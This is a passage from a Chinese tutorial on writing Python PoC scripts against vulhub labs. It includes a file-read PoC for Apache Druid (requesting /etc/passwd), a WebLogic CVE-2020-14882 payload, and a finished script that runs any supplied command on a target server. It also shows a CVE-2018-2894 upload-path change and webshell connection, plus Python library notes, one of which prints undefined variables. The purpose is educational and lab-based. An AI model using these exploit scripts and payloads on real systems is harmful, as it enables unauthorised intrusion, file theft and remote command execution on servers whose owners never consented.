    | |      \ \/ / |  __|______/ /| | | |/ / | |______|__ <| '_ \ / / |__   _\__, |
    | |____   \  /  | |____    / /_| |_| / /_ | |      ___) | (_) / /     | |   / / 
     \_____|   \/   |______|  |____|\___/____||_|     |____/ \___/_/      |_|  /_/  
     """)
    
    def Poc():
        # 此模块是调用上面 def argument()，模块之间直接调用，将 argument() 函数赋值给 args，然后 url 被 args.url 定义用于参数化输入，最终 url 被 request.post 调用
        args = argument()
        url = args.url
    
        # 漏洞验证 Paylaod ，设置一个 lists 列表存储
        lists = [
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini"
        ]
    
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    
        try:
            # list 参数遍历已定义的 lists 参数值
            for list in lists:
                # burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 "uris" 的参数值
                post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":[list]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    
                # 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求
                res = requests.post(url,json=post_data,headers=headers,verify=False, allow_redirects=False)
    
                # 若返回的响应中存在 "root:x" 或者 "[fonts]" 则证明存在漏洞，否则不存在
                if "root:x" in res.text or "[fonts]" in res.text:
                    print("[+] 存在 Apache Druid LoadData 任意文件读取漏洞 ")
                    break
                else:
                    print("[-] 不存在 Apache Druid LoadData 任意文件读取漏洞")
                    break
        except Exception as e:
            print("[-] 请检查输入是否有误!")
    
    # 主函数先执行 banner() 里面的代码再执行 Poc() 里面的代码
    if __name__ == '__main__':
        banner()
        Poc()
    

![](./img/3633826141088609101.png)

## 四、远程命令执行（Remote Command Execution，RCE）

### Weblogic CVE-2020-14882 未授权远程命令执行

#### 环境搭建

    
    
    # 下载 vulhub
    https://github.com/vulhub/vulhub
    
    # 进入 CVE-2020-14882 目录输入命令启动环境
    dodocker-compose up -d

![](./img/2641837092689316778.png)

访问后台 `http://192.168.148.155:7001/console/login/LoginForm.jsp`

![](./img/6019256925419441323.png)

环境本身所存在的未授权访问漏洞
`http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal`

![](./img/3546901164483282607.png)

> 影响版本：WebLogic Server 10.3.6.0.0、WebLogic Server 12.1.3.0.0、WebLogic Server
> 12.2.1.3.0、WebLogic Server 12.2.1.4.0、WebLogic Server 14.1.1.0.0

#### POC 代码编写分析

利用 Burp 抓取未授权访问后台的数据请求包

    
    
    GET /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
    Host: 192.168.148.155:7001
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747
    Connection: close

![](./img/4649512789268049187.png)

修改数据请求包为 POST，插入漏洞 Payload 触发漏洞，漏洞数据包如下：

    
    
    POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
    Host: 192.168.148.155:7001
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    cmd: ls
    Content-Length: 1223
    
    _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");

![](./img/3486228599491375396.png)

#### 分析小结

漏洞处于后台的 POST 请求，但由于存在未授权访问，所以登录认证不需要理会，在编写 Poc 只需定义好请求头以及请求包再处理返回的结果即可

> 1、系统存在未授权访问，直接前台 GET 请求，但由于漏洞点为 POST 请求，所以漏洞验证时要将 GET 修改为 POST 请求
> ，并定义好请求头以及请求体
>
> 2、当存在漏洞时返回命令执行的响应

#### Poc 初步编写

根据上面的学习，我们已经基本了解 Poc 编写的简单流程了，按老规矩，先简单实现漏洞验证，再美化代码

    
    
    # coding:utf-8
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    import http.client
    
    # 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1，相关的限制或问题，具体没深究
    http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
    
    # 设置未授权的后台链接
    url = "http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal"
    
    # 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
                             'Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                         '*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
               'Content-Type': 'application/x-www-form-urlencoded',
               'cmd': 'ls'
    }
    
    # POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用''' ''' 包括字符即可
    payload = '''_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if (cmd != null) {String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write("");}executeThread.interrupt();')'''
    
    # 利用 requests 进行 POST 请求
    res = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
    
    # 输出响应文本
    print(res.text)
    

![](./img/8024208124044961342.png)

#### 完善代码

    
    
    # coding:utf-8
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    import argparse
    import http.client
    
    # 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1
    # 相关的限制或问题，具体没深究
    http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
    
    # 这里和上面一样，利用 argsparse 库将要输入的目录参数化，然后使用 argumet() 函数进行模块化
    def argument():
        parser = argparse.ArgumentParser(description="usage：python3 demo.py -u [url] -c [command]")
        parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='[*] Please assign vulnerable url')
        parser.add_argument('-c', '--cmd', type=str, metavar='', required=True, help='[*] Please assign command')
        args = parser.parse_args()
    
        # 返回 args ，这一步若没有，在下面的 Poc() 函数代码处就无法进行引用
        return args
    
    # 设置 banner，美化输出
    def banner():
        print("""
      _______      ________    ___   ___ ___   ___        __ _  _   ___   ___ ___  
     / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | || | / _ \ / _ \__ \ 
    | |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | || || (_) | (_) | ) |
    | |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |__   _> _ < > _ < / / 
    | |____   \  /  | |____    / /_| |_| / /_| |_| |      | |  | || (_) | (_) / /_ 
     \_____|   \/   |______|  |____|\___/____|\___/       |_|  |_| \___/ \___/____|                                                                             
         """)
    
    # 定义一个 Poc() 函数模块化代码，用于处理定义好的漏洞验证代码
    def Poc():
         # 此模块是调用上面 def argument()，模块之间直接调用，将 argument() 函数赋值给 args，然后 url 被 args.url 定义用于参数化输入，最终 url 被 request.post 调用，cmd 被headers 的 cmd 调用
        args = argument()
        url = args.url
        cmd = args.cmd
    
        # 定义未授权访问的后台路径赋值给 path
        path = "/console/images/%252E%252E%252Fconsole.portal"
    
        # 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
                                 'Safari/537.36',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                             '*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'cmd': cmd
        }
    
        # POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用''' ''' 包括字符即可
        payload = '''_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if (cmd != null) {String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write("");}executeThread.interrupt();')'''
    
        try:
            # 利用 requests 进行 POST 请求
            res = requests.post(url= url+ path, data=payload, headers=headers, verify=False, allow_redirects=False,
                                timeout=10)
            print("[+] Command results are as follows: ")
            print(res.text)
    
        except Exception as e:
            print("[-] Please Check your url and cmd！")
    
    # 主函数执行代码
    if __name__ == '__main__':
        banner()
        Poc()
    

脚本正常执行，并返回的漏洞验证请求的响应

    
    
    python3 demo.py -u http://192.168.148.155:7001/ -c whoami

![](./img/1619031157736322037.png)

    
    
    python3 demo.py -u http://192.168.148.155:7001/ -c id

![](./img/2612266749110650947.png)

脚本执行请求异常后所返回的响应

    
    
    python3 demo.py -u http://192.168.148.155:700 -c id

![](./img/5961096162145911220.png)

`问题记录`：在 burp 放包中，Poc 代码稍有差异，双斜杠 burp 中能执行，python 中不能执行；三斜杠 python 能执行 burp
不能执行，脚本编写时稍微注意一下即可

![](./img/1390896099121959310.png)

![](./img/6582647239301753711.png)

## 五、任意文件上传

### Weblogic 任意文件上传（CVE-2018-2894）

#### 环境搭建

    
    
    # 下载 vulhub
    https://github.com/vulhub/vulhub
    
    # 进入weblogic CVE-2018-2894 目录输入命令启动环境
    dodocker-compose up -d

![](./img/5443875384859933544.png)

![](./img/7649699887291370319.png)

查看得知账户密码 `weblogic/5Qdm6pID`

    
    
    docker-compose logs | grep password

![](./img/2411510230326585230.png)

该漏洞处于后台，漏洞存在条件限制，当后台 `勾选启用Web服务测试页`，用户可在 `ws_utc/config.do` 路径下上传任意文件

![](./img/8927787007491048650.png)

![](./img/2639016209704022213.png)

![](./img/5179130076618353921.png)

访问 `ws_utc/config.do`
路径修改上传文件的存储路径，原路径`/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir`文件上传后无法访问，修改为以下路径无需权限即可访问到上传的文件

    
    
    Linux:
    /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
    
    Windows:
    C:/Oracle\Middleware12.2.1.3/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

![](./img/5089397636898882118.png)

上传文件

![](./img/2286147979590828635.png)

上传位置 `http://192.168.145.188:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`

![](./img/5624612700412588811.png)

webshell 连接
`http://192.168.148.155:7001/ws_utc/css/config/keystore/1684581151178_shell.jsp`

![](./img/2683128110668006114.png)

> 影响版本：WebLogic Server 10.3.6.0.0、WebLogic Server 12.1.3.0.0、WebLogic Server
> 12.2.1.2.0、WebLogic Server 12.2.1.3.0

#### POC 代码编写分析

通过任意文件上传的漏洞复现可知，该漏洞存在于后台，按照上面的思路编写 Poc
会想着先解决登录问题，然后登录后带着请求继续去进行请求，上传文件，根据返回的信息进行判断是否存在漏洞。由于该漏洞是存在条件限制的，我们需先登录后，
`启用Web服务测试页` 且需要更改文件上传的路径才能正常触发漏洞。若按照一步步来
`请求登录-》判断勾选启用Web服务测试页-》修改文件上传路径-》上传文件`，一套编写下来，其实就是一个 EXP
了，对于仅是漏洞验证（POC）的编写来说过于复杂， 这时候我们只需要根据这个漏洞的特性去判断是否存在漏洞即可，不需要整个流程去复刻。

#### 分析小结

分析后发现若存在漏洞会在 `/ws_utc/resources/setting/options/general`
路径下访问到一个特定的页面，我们就可以简单化，通过抓取页面关键字进行漏洞判断即可

![](./img/1369772530624888283.png)

#### Poc 初步编写

    
    
    # coding:utf-8
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    
    # 漏洞url
    url = "http://192.168.148.155:7001/ws_utc/resources/setting/options/general"
    
    # 设置headers
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
    
    # 进行get请求
    res = requests.get(url=url, headers=headers, timeout=5, verify=False, allow_redirects=False)
    
    # 若get请求页面中存在<name>BasicConfigOptions.workDir</name>则存在漏洞
    if "<name>BasicConfigOptions.workDir</name>" in res.text:
        print("[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞")
    else:
        print("[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞")
    

![](./img/4226202310729021553.png)

#### 完善代码

    
    
    # coding:utf-8
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    import argparse
    
    def argument():
        parser = argparse.ArgumentParser(description="usage：python3 demo.py -u [url]")
        parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='Please input the vulnerable url')
        args = parser.parse_args()
        return args
    
    def banner():
        print("""
      _______      ________    ___   ___  __  ___      ___   ___   ___  _  _   
     / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |__ \ / _ \ / _ \| || |  
    | |     \ \  / /| |__ ______ ) | | | || | (_) |_____ ) | (_) | (_) | || |_ 
    | |      \ \/ / |  __|______/ /| | | || |> _ <______/ / > _ < \__, |__   _|
    | |____   \  /  | |____    / /_| |_| || | (_) |    / /_| (_) |  / /   | |  
     \_____|   \/   |______|  |____|\___/ |_|\___/    |____|\___/  /_/    |_|                                                                      
     """)
    
    def Poc():
        # 引入 argument() 函数
        args = argument()
        url = args.url
    
        # 设置 headers
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
    
        try:
            # 进行get请求
            res = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
    
            # 若get请求页面中存在<name>BasicConfigOptions.workDir</name>则存在漏洞
            if "<name>BasicConfigOptions.workDir</name>" in res.text:
                print("[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞")
            else:
                print("[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞")
        except Exception as e:
            print("[-] 请检查输入是否有误!")
    
    if __name__ == '__main__':
        banner()
        Poc()
    

![](./img/1265005289706120300.png)

![](./img/909756622108190904.png)

![](./img/2914255420215143204.png)

## 六、总结

通过结合几个类型的漏洞进行 Poc 编写，其漏洞验证手段主要是通过`匹配漏洞页面的特征码`去判断该网站是否存在漏洞，主要使用了 `requests`
库去实现模拟用户进行请求，然后匹配特征码进行漏洞判断，Poc 编写的难度不大，而完整的利用脚本即 Exp 的编写难度相对 Poc
难度要大一点，代码能力要求也相对要扎实一点。

## 七、扩展

### sys 库

类似于 argparse 库，用于参数化输入

    
    
    import sys
    
    def main():
        # 检查命令行参数数量
        if len(sys.argv) != 3:
            print("使用方法: python myapp.py <参数1> <参数2>")
            sys.exit(1)
    
        # 获取命令行参数
        url = sys.argv[1]
        command = sys.argv[2]
    
        # 打印命令行参数
        print("参数1:", arg1)
        print("参数2:", arg2)
    
        # 进行其他操作...
        # ...
    
    if __name__ == "__main__":
        main()
    

### json 库

json 库可用于处理JSON数据

    
    
    # 输出 json 特定参数值
    import json
    
    json_str = '{"name": "John", "age": 30, "city": "New York"}'
    data = json.loads(json_str)
    
    print(data["name"]) 
    
    输出结果：John
    
    
    # 输出 json 数据
    import json
    
    data = {"name": "John", "age": 30, "city": "New York"}
    json_str = json.dumps(data)
    
    print(json_str)
    
    输出结果:{"name": "John", "age": 30, "city": "New York"}
    
    
    # 从文件中读取json
    import json
    
    with open("data.json") as json_file:
        data = json.load(json_file)
    
    print(data["name"])
    
    
    # 将数据写入json文件
    import json
    
    data = {"name": "John", "age": 30, "city": "New York"}
    
    with open("data.json", "w") as json_file:
        json.dump(data, json_file)
    

### time 库

    
    
    # 获取当前时间戳
    import time
    
    timestamp = time.time()
    print("当前时间戳:", timestamp)
    
    
    # 将时间戳转换为可读时间
    import time
    
    timestamp = 1626832045  # 示例时间戳
    readable_time = time.ctime(timestamp)
    print("可读时间:", readable_time)
    
    
    # 延迟执行
    import time
    
    print("开始执行")
    time.sleep(2)  # 暂停2秒
    print("继续执行")
    
    
    # 记录代码执行时间
    import time
    
    start_time = time.time()
    res = requests.post(url, headers=headers, data=data) # 例子，记录用户请求开始时间（start_time）和结束时间（end_time）,于 res 请求 post 数据开始记录
    end_time = time.time()
    
    execution_time = end_time - start_time
    
    print(execution_time)
    

### open函数

    
    
    # 打开文件进行读取
    with open('file.txt', 'r') as file:
        content = file.read()
    
    print(content)
    
    
    # 打开文件进行逐行读取
    with open('file.txt', 'r') as file:
        for line in file:
            print(line)
    
    # 打开文件进行写入
    with open('file.txt', 'w') as file:
        file.write('Hello, World!\n')
        file.write('This is a new line.\n')
    
    # 打开文件进行追加
    with open('file.txt', 'a') as file:
        file.write('This is an additional line.\n')
    

## 八、参考

    
    
    https://github.com/BrucessKING/CVE-2021-36749/blob/main/CVE-2021-36749.py
    https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py
    https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py
    https://blog.csdn.net/caiqiiqi/article/details/115299924
    https://blog.riskivy.com/weblogic-cve-2018-2894/

> 本文中提供的 PoC
> 和漏洞验证信息仅供教育和研究目的。使用此信息时，读者应该遵守所有适用的法律法规和道德规范。作者对任何因使用或滥用此信息而导致的任何损失或损害概不负责。读者应自行承担使用此信息的风险和责任。

